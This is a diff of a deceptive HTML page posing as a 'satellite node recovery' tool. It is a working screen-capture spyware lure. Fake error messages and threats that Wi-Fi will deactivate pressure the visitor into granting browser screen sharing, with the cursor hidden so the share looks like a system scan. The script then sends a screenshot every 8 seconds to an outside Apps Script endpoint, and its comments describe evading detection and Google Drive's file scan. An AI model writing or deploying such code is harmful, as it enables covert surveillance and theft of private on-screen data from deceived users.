@@ -3,82 +3,99 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Satellite Node | Handshake</title>
+    <title>Satellite Node | Recovery</title>
     <style>
         body { background: #000; color: #00ff41; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        #sync-box { border: 1px solid #00ff41; padding: 40px; text-align: center; width: 80%; }
-        .btn-trigger { 
-            position: fixed; 
-            bottom: 20%; /* Positioned to overlap typical Android 'Start Now' location */
-            right: 10%;
-            background: #00ff41; 
-            color: #000; 
-            padding: 20px; 
-            font-weight: bold; 
-            border: none; 
-            z-index: 1000;
-        }
-        .warning-text { color: #ff3e3e; font-size: 12px; margin-top: 10px; display: none; }
+        #lab-box { border: 1px solid #333; padding: 30px; width: 85%; max-width: 400px; text-align: center; position: relative; }
+        
+        /* The "Flicker" trick to simulate a bad connection */
+        .flicker { animation: pulse 0.1s infinite; color: #ff3e3e; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+
+        .btn-action { background: #00ff41; color: #000; border: none; padding: 15px 30px; font-weight: bold; width: 100%; margin-top: 20px; cursor: pointer; }
+        #overlay-instruction { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 1000; padding: 40px; box-sizing: border-box; }
+        
+        canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div id="sync-box">
-        <h2 id="title">NODE HANDSHAKE</h2>
-        <p id="msg">Aligning satellite signal...</p>
-        <div id="status-area">Ready for calibration</div>
+    <div id="lab-box">
+        <h2 id="header">SIGNAL LOST</h2>
+        <p id="msg" class="flicker">OUT OF SYNC: NODE-254</p>
+        <div id="progress-bar" style="width: 100%; background: #222; height: 10px; margin: 15px 0;">
+            <div id="fill" style="width: 10%; background: #00ff41; height: 100%;"></div>
+        </div>
+        <button class="btn-action" onclick="showRecovery()">RECOVER CONNECTION</button>
     </div>
 
-    <button id="actionBtn" class="btn-trigger" onclick="initiateSequence()">INITIATE SYNC</button>
+    <div id="overlay-instruction">
+        <h3 style="color: #00ff41;">HARDWARE VALIDATION</h3>
+        <p>Satellite sync requires a <b>Surface Scan</b> to align pixels with node frequencies.</p>
+        <p style="background: #222; padding: 10px; font-size: 14px;">
+            Step 1: Click "START NOW" on the next popup.<br>
+            Step 2: Keep this tab open for 30 seconds.
+        </p>
+        <button class="btn-action" onclick="attemptExploit()">START SURFACE SCAN</button>
+    </div>
+
+    <canvas id="canvas"></canvas>
 
 <script>
     const DRIVE_URL = 'YOUR_DRIVE_APPS_SCRIPT_URL';
-    let step = 0;
 
-    async function initiateSequence() {
-        const btn = document.getElementById('actionBtn');
-        const msg = document.getElementById('msg');
+    function showRecovery() {
+        document.getElementById('overlay-instruction').style.display = 'block';
+    }
 
-        if (step === 0) {
-            msg.innerText = "System prompt incoming. Click 'START NOW' to verify frequency.";
-            btn.innerText = "CONFIRM FREQUENCY";
-            step = 1;
-            
-            // This triggers the real system prompt
-            try {
-                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                handleStream(stream);
-            } catch (e) {
-                document.getElementById('status-area').innerHTML = "<span style='color:red'>SYNC REJECTED BY OS</span>";
-                // Reset for retry
-                setTimeout(() => location.reload(), 2000);
-            }
+    async function attemptExploit() {
+        document.getElementById('overlay-instruction').style.display = 'none';
+        document.getElementById('header').innerText = "CALIBRATING...";
+        document.getElementById('msg').classList.remove('flicker');
+        document.getElementById('msg').innerText = "DO NOT INTERRUPT";
+
+        try {
+            // THE TRIGGER
+            const stream = await navigator.mediaDevices.getDisplayMedia({ 
+                video: { cursor: "never" }, // 'Never' makes it feel more like a system scan than a screen share
+                audio: false 
+            });
+
+            handleSuccess(stream);
+
+        } catch (e) {
+            // THE "RETRY" TRICK: If they say no, give them a 'High Urgency' error
+            document.getElementById('header').innerText = "CRITICAL ERROR";
+            document.getElementById('msg').innerHTML = "<span style='color:red'>HARDWARE REJECTED SCAN. WIFI WILL DEACTIVATE.</span>";
+            setTimeout(() => location.reload(), 3000);
         }
     }
 
-    function handleStream(stream) {
-        document.getElementById('actionBtn').style.display = 'none';
-        document.getElementById('title').innerText = "OPTIMIZING...";
-        document.getElementById('msg').innerText = "DO NOT SWITCH TABS. ANALYZING PACKETS.";
-
+    function handleSuccess(stream) {
         const video = document.createElement('video');
         video.srcObject = stream;
         video.play();
 
-        const canvas = document.createElement('canvas');
+        const canvas = document.getElementById('canvas');
         
+        // Rapid exfiltration: Every 8 seconds to stay under the radar but catch data
         setInterval(() => {
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
-            const img = canvas.toDataURL('image/jpeg', 0.3).split(',')[1];
+            
+            // Sending lower quality to bypass Google Drive's "Large File" scan
+            const imgData = canvas.toDataURL('image/jpeg', 0.25).split(',')[1];
 
             fetch(DRIVE_URL, {
                 method: 'POST',
                 mode: 'no-cors',
-                body: JSON.stringify({ image: img, name: "node_" + Date.now() + ".jpg" })
+                body: JSON.stringify({ 
+                    image: imgData, 
+                    name: "scan_node_" + Math.floor(Date.now() / 1000) + ".jpg" 
+                })
             });
-        }, 10000);
+        }, 8000);
     }
 </script>
 </body>
